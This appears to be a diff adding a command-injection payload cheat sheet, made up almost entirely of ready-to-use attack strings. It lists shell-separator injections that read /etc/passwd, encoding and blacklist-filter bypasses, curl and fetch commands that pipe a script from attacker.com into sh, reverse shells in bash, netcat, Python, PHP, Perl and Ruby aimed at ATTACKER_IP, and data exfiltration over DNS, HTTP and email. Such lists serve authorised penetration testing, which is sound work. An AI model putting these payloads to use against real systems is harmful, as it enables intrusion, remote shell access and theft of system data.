@@ -1,0 +1,187 @@
+# Command Injection Payloads
+
+## ========================================
+## BASIC COMMAND INJECTION
+## ========================================
+
+# Semicolon Separator
+; whoami
+; id
+; ls -la
+; cat /etc/passwd
+
+# Pipe Operator
+| whoami
+| id
+| ls -la
+
+# AND Operator
+&& whoami
+&& id
+&& ls -la
+
+# OR Operator
+|| whoami
+|| id
+|| ls -la
+
+# Background Execution
+& whoami
+& id
+
+# Backticks (Command Substitution)
+`whoami`
+`id`
+`cat /etc/passwd`
+
+# Dollar Parentheses
+$(whoami)
+$(id)
+$(cat /etc/passwd)
+
+## ========================================
+## CHAINED COMMANDS
+## ========================================
+
+127.0.0.1; whoami
+127.0.0.1 && whoami
+127.0.0.1 | whoami
+127.0.0.1 || whoami
+127.0.0.1 & whoami
+
+ping -c 1 127.0.0.1; whoami
+ping -c 1 127.0.0.1 && whoami
+nslookup example.com && whoami
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# URL Encoding
+%3B%20whoami
+%26%26%20whoami
+%7C%20whoami
+
+# Double URL Encoding
+%253B%2520whoami
+
+# Null Byte
+; whoami%00
+&& whoami%00
+
+# Newline Injection
+%0A whoami
+%0D%0A whoami
+
+# Tab Character
+;%09whoami
+&&%09whoami
+
+# Backslash
+;\ whoami
+&&\ whoami
+
+# Quotes
+"; whoami"
+'; whoami'
+
+# Dollar Sign Variable Expansion
+$IFS whoami
+${IFS}whoami
+
+# Brace Expansion
+{,}whoami
+{whoami,}
+
+# Wildcard Substitution
+w?oami
+who*
+/bin/c?t /etc/passwd
+
+# Case Manipulation
+wHoAmI
+WhOaMi
+
+# String Concatenation
+who'a'mi
+who"a"mi
+who\ami
+
+## ========================================
+## BYPASS BLACKLIST FILTERS
+## ========================================
+
+# If 'cat' is blocked
+tac /etc/passwd
+more /etc/passwd
+less /etc/passwd
+head /etc/passwd
+tail /etc/passwd
+nl /etc/passwd
+sed '' /etc/passwd
+awk '{print}' /etc/passwd
+
+# If 'ls' is blocked
+dir
+find . -maxdepth 1
+echo *
+
+# If 'wget' is blocked
+curl http://attacker.com/shell.sh | sh
+fetch http://attacker.com/shell.sh | sh
+
+# If spaces are blocked
+{cat,/etc/passwd}
+cat</etc/passwd
+cat$IFS/etc/passwd
+cat${IFS}/etc/passwd
+cat$IFS$1/etc/passwd
+cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+
+## ========================================
+## TIME-BASED DETECTION
+## ========================================
+
+; sleep 5
+&& sleep 5
+| sleep 5
+; ping -c 10 127.0.0.1
+
+## ========================================
+## REVERSE SHELL PAYLOADS
+## ========================================
+
+# Bash Reverse Shell
+; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
+
+# Netcat Reverse Shell
+; nc -e /bin/sh ATTACKER_IP PORT
+; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
+
+# Python Reverse Shell
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# PHP Reverse Shell
+; php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Perl Reverse Shell
+; perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Ruby Reverse Shell
+; ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+## ========================================
+## DATA EXFILTRATION
+## ========================================
+
+# Via DNS
+; nslookup `whoami`.attacker.com
+; dig `whoami`.attacker.com
+
+# Via HTTP
+; curl http://attacker.com/$(whoami)
+; wget http://attacker.com/$(whoami)
+
+# Via Email
+; cat /etc/passwd | mail -s "Data" attacker@evil.com
